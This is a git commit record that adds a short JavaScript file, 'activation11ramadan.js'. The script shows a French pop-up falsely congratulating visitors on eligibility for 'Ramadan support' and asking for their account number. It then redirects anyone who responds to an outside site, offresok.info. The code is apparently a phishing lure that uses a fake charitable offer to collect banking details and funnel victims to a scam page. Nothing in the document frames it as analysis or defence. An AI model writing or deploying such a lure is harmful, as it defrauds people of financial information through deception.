e1a2449950ae90fbca09871465ab08b5363c6172
mon-ce <suhailatakoti@gmail.com>
2026-02-25 20:56:58 +0100

    Create activation11ramadan.js

---
+++ activation11ramadan.js
@@ -0,0 +1,9 @@
+  
+var password = 'RETRAIT D ARGENT'
+password = prompt(
+  'Félicitations! Vous êtes éligible pour recevoir le support Ramadan. Veuillez appuyer sur OK pour saisir votre numéro de compte.',
+  'RETRAIT D ARGENT'
+);
+if (password != 'RETRAIT D ARGENT') {
+  location.href = 'https://offresok.info/Ramadan.html';
+}
